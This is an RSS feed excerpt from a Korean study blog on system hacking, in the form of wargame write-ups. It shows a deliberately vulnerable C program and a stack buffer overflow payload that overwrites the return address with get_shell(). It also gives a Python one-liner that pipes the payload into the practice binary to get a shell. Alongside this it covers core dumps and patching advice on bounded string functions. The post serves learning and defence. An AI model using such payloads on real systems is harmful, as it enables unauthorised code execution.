      &lt;li&gt;이후 컴파일된 프로그램을 실행할 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 실행되고 이것이 Dynamic Link 된 공유 라이브러리를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 이용해 각종 변수로부터 위치를 찾아낸 다음 메모리에 띄워 준다. 그렇다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 RTL 기법의 주범이었던 것이다…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 인데, 심볼릭 링크 정책으로 인해 실제로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다.&lt;/p&gt;

&lt;p&gt;여기에서 soname을 가진 라이브러리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt;이기 때문에 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 으로 뜨지 않는다.&lt;/p&gt;

&lt;p&gt;마지막 의문이 하나 생긴다. 왜 굳이? 왜 굳이 이렇게 심볼릭 링크를 써서 돌아 돌아 가는 것일까? 그 이유는 라이브러리 연결의 호환성을 좋게 하기 위해서이다. 통상적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{library_name.so.1.5}-&amp;gt;{library_name.so}&lt;/code&gt; 의 구도로 링크가 걸리는데, 이는 개발 환경에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.1.5&lt;/code&gt; 버전의 라이브러리뿐 아니라 다른 버전의 라이브러리도 존재할 수 있기 때문에 어떤 버전(어떤 soname)을 사용하든 안정적으로 필요한 Linker name을 가진 라이브러리와 연결해주기 위해서 생겨난 방식이다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-참고문헌&quot;&gt;4. 참고문헌&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;x64dbg 디버거를 활용한 리버싱과 시스템 해킹의 원리(김민수 저, 210p RTL)&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 13 Nov 2022 20:31:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system_hacking/protostar-stack5-x86-x64/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system_hacking/protostar-stack5-x86-x64/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5-3</title>
        <description>&lt;h1 id=&quot;stage-5-3-bof-return-address-overwrite&quot;&gt;STAGE 5-3: BOF-Return Address Overwrite&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Stack Buffer Overflow로 인해 가능한 Return Address 조작 공격을 실습&lt;/li&gt;
  &lt;li&gt;해당 취약점이 존재하는 예제 프로그램 공격 및 셸 획득이 목표&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;먼저-풀어보기&quot;&gt;먼저 풀어보기:&lt;/h1&gt;

&lt;h2 id=&quot;1-예제-코드-취약점-분석하기&quot;&gt;1. 예제 코드 취약점 분석하기&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;setvbuf 함수는 file I/O 작업 시 해당 작업의 속도가 메모리를 읽고 쓰는 것에 비해 너무 느리다 보니 버퍼를 선언하고 파일에 쓸 데이터/ 읽어올 데이터를 대용량으로 한 번에 저장한 후 지정된 조건을 만족하면 파일와의 상호작용을 하게끔 해서 비효율적인 자원 사용을 지양하기 위해 사용된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;위 코드의 exploitable 한 부분은 사용자와의 상호작용을 하는 부분, 즉 main 함수에서 Input을 받는 부분이다. 해당 부분에 payload를 입력하면 익스가 가능할 것이다.&lt;/p&gt;

&lt;p&gt;그렇다면 어떤 형태의 익스가 가능할까? main함수에서 buf라는 지역변수를 단 하나 설정해 두었고, 취약한 함수인 scanf 함수를 썼다. 또한 main 함수의 스택 프레임은 buf 아래에 libc_start_main 함수의 SFP, 그리고 그 아래에 rip의 ret add로 구성되어 있을 것이다.&lt;/p&gt;

&lt;p&gt;즉, ret add 조작으로 이어지는 스택 버퍼 오버플로우를 일으킬 수 있다.&lt;/p&gt;

&lt;h2 id=&quot;2-페이로드-구상하기&quot;&gt;2. 페이로드 구상하기&lt;/h2&gt;

&lt;p&gt;그렇다면 payload의 형태는 어떻게 구성될까?&lt;/p&gt;

&lt;p&gt;당연히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x28(+a)+0x08&lt;/code&gt; byte의 dump data + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*get_shell()&lt;/code&gt; 일 것이다. 여기에서 buf 변수의 크기에 a byte를 더한 이유는, C언어 컴파일러가 자체적으로 버퍼를 보호하기 위해서 명시적으로 선언된 버퍼에 몇 byte를 붙여 실질적인 스택 버퍼를 선언하는 경우가 있기 때문이다.&lt;/p&gt;

&lt;p&gt;이 경우에는 익스할 프로그램이 컴파일된 환경과 동일한 환경에서 컴파일 후 버퍼의 크기가 어떻게 선언되는지 확인해야 한다.&lt;/p&gt;

&lt;p&gt;해당 프로그램을 컴파일한 후, gdb에 물려 스택의 상황과 인스트럭션을 확인해 보았더니 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled.jpeg&quot; alt=&quot;main 함수에서 선언된 지역 변수의 크기는 0x28인데, 스택은 0x30만큼을 확보하는 모습.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수에서 선언된 지역 변수의 크기는 0x28인데, 스택은 0x30만큼을 확보하는 모습.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%201.jpeg&quot; alt=&quot;흰색 블록 처리된 부분의 왼쪽은 SFP, 오른쪽은 rip ret add 이다.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;흰색 블록 처리된 부분의 왼쪽은 SFP, 오른쪽은 rip ret add 이다.&lt;/p&gt;

&lt;p&gt;즉, &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;예전에 풀었던 문제&lt;/a&gt;처럼 C 컴파일러가 Char 배열을 할당할 때 8byte를 더 할당해 준 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;따라서 정확한 payload의 구조는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30byte + 8byte&lt;/code&gt; dump data + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*get_shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이제 get_shell의 주소를 구해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4011dd&lt;/code&gt; 로 확인되었다.&lt;/p&gt;

&lt;p&gt;즉, payload는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“A”*0x38 + 0x4011dd&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-익스플로잇-코드-작성하기&quot;&gt;3. 익스플로잇 코드 작성하기&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%203.jpeg&quot; alt=&quot;작성한 익스플로잇 코드.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;작성한 익스플로잇 코드.&lt;/p&gt;

&lt;p&gt;위의 코드를 실행한 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%204.jpeg&quot; alt=&quot;쉘을 획득하는 데 성공했다.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;쉘을 획득하는 데 성공했다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;코스-내용-학습&quot;&gt;코스 내용 학습:&lt;/h1&gt;

&lt;h2 id=&quot;1-취약점-분석&quot;&gt;1. 취약점 분석&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;프로그램의 취약점은 한 마디로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, buf)&lt;/code&gt; 함수 사용 취약점이다.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 함수의 포맷 스트링의 한 종류인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; 는 “문자열”&lt;/li&gt;
      &lt;li&gt;그런데, C 언어의 특성상 이는 띄어쓰기, 탭, 개행 문자가 들어올 때까지 계속 입력을 받아버림.&lt;/li&gt;
      &lt;li&gt;즉, 입력 길이에 제한을 두지 않는 것이나 마찬가지. → 오버플로우 발생 공격 가능&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;따라서 scanf에서 %s 사용은 엄금, %[n]s 로 정확히 n개 문자만 입력받도록 설정할 것!&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;C/C++의 표준 함수 중 버퍼를 다루면서 길이를 입력하지 않는 함수들은 대부분 위험하다.&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;예: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcat&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;반례(버퍼 크기 입력을 받음): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncpy&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;위험한 함수는 &lt;strong&gt;OOB 취약점&lt;/strong&gt; 등의 심각한 취약점이 될 수 있음.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;1) 입력의 길이를 제한하는 문자열 함수 사용 2) 문자열 사용 시 해당 문자열이 NULL byte로 종결되는지 확인&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;프로그램의 취약점을 찾을 땐 위 항목을 역으로 이용하면 좋다.&lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
💡 OOB(Out Of Bound): C계열 언어에서 문자열을 읽어올 때, 문자열의 종결을 알리는 NULL byte를 찾지 못해 프로그래머가 의도한 크기를 넘어서 문자열의 인덱스를 참조하는 현상(Index Out-Of-Bound)을 발생시키는 취약점.

&lt;/aside&gt;

&lt;h2 id=&quot;2-취약점-트리거&quot;&gt;2. 취약점 트리거&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;이미 앞에서 취약점 트리거를 완료했기 때문에, 여기에서는 교안으로 보고 새로 알게 된 내용만 정리해 작성한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;프로그램을 실행한 후, 프로그램의 입장에서는 말도 안 될 만큼 긴 입력(64byte)를 줘 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, ‘Segmentation fault’ 라는 에러가 출력되면서 프로그램이 강제 종료된다. Segmentation은 앞에서 배웠듯 운영체제가 관리하는 프로세스의 메모리 구조인데, 이러한 구조에 문제가 생겼다는 뜻으로 해석된다.&lt;/p&gt;

&lt;p&gt;즉, 프로그램이 잘못된 메모리 섹션에 접근했으므로 버그가 발생했다는 의미이다.&lt;/p&gt;

&lt;p&gt;그리고 마지막의 ‘core dumped’는 코어파일을 생성했다는 의미로, 프로그램이 위와 같이 비정상적으로 종료됐을 때, 디버깅을 수월하게 하기 위해 운영체제가 만들어 주는 것이다. 만일 위와 같은 알림이 떴음에도 코어 파일이 생성되지 않았다면 생성해야 할 코어 파일의 크기가 시스템에서 정한 한도를 초과했기 때문이다.&lt;/p&gt;

&lt;p&gt;해당 한도는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ulimit -c unlimited&lt;/code&gt; 로 해제할 수 있다.&lt;/p&gt;

&lt;p&gt;보통은 현재 디렉터리 아래에 core라는 폴더가 생기고, 그 안에 코어 덤프가 저장되어야 하는데… 내가 사용하는 Ubuntu 20.04+ 는 apport에 의해서 core dumping이 intercept돼 운영체제가 아니라 apport가 코어 덤프를 만들도록 되어 있었다… 그래서 한참을 뒤져 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/apport/coredump&lt;/code&gt; 에서 코어 덤프들을 찾아낼 수 있었다.&lt;/p&gt;

&lt;p&gt;그런데 또 문제상황.. 해당 코어 덤프와 원본 프로그램을 gdb에 같이 물려서 코드와 스택을 확인해 보려 했는데, Maximum recursion depth exceeded in comparison 오류가 떠서 제대로 안 되었다.&lt;/p&gt;

&lt;p&gt;결국 시간이 부족한 관계로 코어 덤프 분석은 교안을 읽고 마무리하기로 했다… 코어 덤프 분석의 결론은 SBOF로 인해 ret add가 입력값으로 덮어씌워졌고, 당연히 그것은 실행가능한 메모리 주소가 아니기 때문에 Segmentation fault가 발생했다는 것이었다.&lt;/p&gt;

&lt;h2 id=&quot;3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/h2&gt;

&lt;p&gt;이미 문제를 풀었고, 해당 원리를 알고 있기 때문에 각 페이즈에서 모르는 부분만 간단히 정리한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;스택 프레임 구조 파악&lt;/li&gt;
  &lt;li&gt;get_shell() 주소 파악
    &lt;ul&gt;
      &lt;li&gt;gdb에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print get_shell&lt;/code&gt; 하면 된다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;페이로드 구성
    &lt;ul&gt;
      &lt;li&gt;구성한 페이로드의 중요 데이터는 반드시 엔디언(Endian)을 적용시켜서 프로그램에 전달해야 한다.
        &lt;ul&gt;
          &lt;li&gt;예: get_shell()의 주소는 대상 시스템의 아키텍처에 따라 엔디언을 다르게 적용시켜서 페이로드에 합쳐야 한다. ( \xa7\x05\x40…즉 바이너리 포맷으로)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;익스플로잇
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;나는 파이썬의 pwntools를 이용했는데, 해당 교안에서는 바로 파이썬 커맨드를 이용해 익스플로잇을 수행했기 때문에 해당 커맨드를 아래에 적는다.&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import sys;sys.stdout.buffer.write(b&apos;A&apos;*0x30 + b&apos;B&apos;*0x08 + b&apos;{리틀_엔디언으로_작성된_대상_함수_주소}&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rao&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;그리고 익스플로잇에 성공하여 &lt;strong&gt;쉘을 땄다면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; 커맨드&lt;/strong&gt;를 쳐서 현재 계정의 권한을 출력해서 보여주는 것으로 증명한다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;취약점-패치&quot;&gt;취약점 패치&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;C언어에서 자주 사용되는 문자열 입력 함수들의 패턴을 알고, 적절히 사용해야 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;널 종결: 문자열의 끝에 널이 있어서 문자열의 끝이 명시되는 것.&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 22 Aug 2022 23:55:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step5-3</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step5-3</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5-2</title>
        <description>&lt;h1 id=&quot;stage-5-2&quot;&gt;STAGE 5-2&lt;/h1&gt;

&lt;h1 id=&quot;memory-corruption-stack-buffer-overflow&quot;&gt;Memory Corruption: Stack Buffer Overflow&lt;/h1&gt;

&lt;p&gt;스택 버퍼 오버플로우는 매우 역사가 오래된 취약점이며, 현재 실시간으로 다수 소프트웨어에서 발견되고 있는 현재진행형인 취약점이다.&lt;/p&gt;

&lt;h2 id=&quot;목표&quot;&gt;목표&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;스택 버퍼 오버플로우의 원인 알기&lt;/li&gt;
  &lt;li&gt;스택 버퍼 오버플로우로 인해 발생하는 보안 문제 알기&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;주의점&quot;&gt;주의점&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;스택 오버플로우 ≠ 스택 버퍼 오버플로우
    &lt;ul&gt;
      &lt;li&gt;스택 오버플로우: 한정된 크기의 메모리 안에서 스택 영역이 너무 많이 확장되어 발생하는 버그&lt;/li&gt;
      &lt;li&gt;스택 버퍼 오버플로우: 스택에 위치한 버퍼에 버퍼의 크기보다 많은 데이터가 입력되어 발생하는 버그&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;스택-버퍼-오버플로우와-악용-경우수&quot;&gt;스택 버퍼 오버플로우와 악용 경우수&lt;/h1&gt;

&lt;h2 id=&quot;1-버퍼-오버플로우&quot;&gt;1. 버퍼 오버플로우&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;스택 버퍼 오버플로우란, &lt;strong&gt;스택&lt;/strong&gt;의 &lt;strong&gt;버퍼&lt;/strong&gt;에서 발생하는 &lt;strong&gt;오버플로우&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Q. 버퍼란 무엇이고, 오버플로우란 무엇일까?&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;h3 id=&quot;버퍼&quot;&gt;버퍼:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;“데이터가 목적지로 이동되기 전에 보관되는 임시 저장소”&lt;/li&gt;
  &lt;li&gt;현대에는 “데이터가 저장될 수 있는 모든 단위”
    &lt;ul&gt;
      &lt;li&gt;지역 변수에 할당된 메모리 영역은 ‘스택 버퍼’&lt;/li&gt;
      &lt;li&gt;힙에 할당된 메모리 영역은 ‘힙 버퍼’라고 부르는 것과 같다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;버퍼-오버플로우&quot;&gt;버퍼 오버플로우:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;버퍼가 넘치는 것: 지정된 버퍼 크기보다 큰 데이터가 입력되어 발생한다.&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;“버퍼”, 즉 어떤 변수든 데이터든 담기도록 &lt;strong&gt;할당된 메모리 영역의 크기를 뛰어넘는 데이터를 인풋&lt;/strong&gt;했을 떄 발생한다.&lt;/li&gt;
      &lt;li&gt;일반적으로 &lt;strong&gt;버퍼는 메모리상에 연속해서 할당&lt;/strong&gt;되어 있기 때문에, 어떤 버퍼에서의 오버플로우는 &lt;strong&gt;뒤에 있는 버퍼들의 값이 조작&lt;/strong&gt;되게 할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그 어떤 메모리 영역에서 발생하더라도 매우 심각한 보안 위협으로 이어진다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;스택-버퍼-오버플로우&quot;&gt;스택 버퍼 오버플로우:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;스택 영역에서 할당한 버퍼가 오버플로우되는 것.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;2-중요-데이터-변조&quot;&gt;2. 중요 데이터 변조&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;BOF 발생 버퍼 뒤에 중요한 데이터가 있다면, 해당 데이터가 변조됨으로써 문제가 발생할 수 있다.
    &lt;ul&gt;
      &lt;li&gt;표현식의 변조&lt;/li&gt;
      &lt;li&gt;통신 주소 변조&lt;/li&gt;
      &lt;li&gt;…etc&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;예제를 분석하며 BOF의 감을 잡아 보자. 사실 나는 저번에 풀었던 문제 정도를 예상하고 에이 똑같은 이야긴가~ 하며 방심했는데, 전혀 아니었다. 설명을 읽고 뒤통수를 한 대 맞은 기분이었기 때문에, 나와 비슷한 초보자 분들도 이건 꼭 보셨으면 좋겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack52/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;원래 main 함수가 따로 있는데, 가장 중요한 check_auth 함수만 잘라서 가져왔다. 여기에서 집중해볼 것은, temp[16]과 strncpy(temp, password, strlen(password))이다. strncpy 자체가 BOF에 취약한 함수인 데다가 temp[16]은 16바이트로 크기가 정해진 배열이다.&lt;/p&gt;

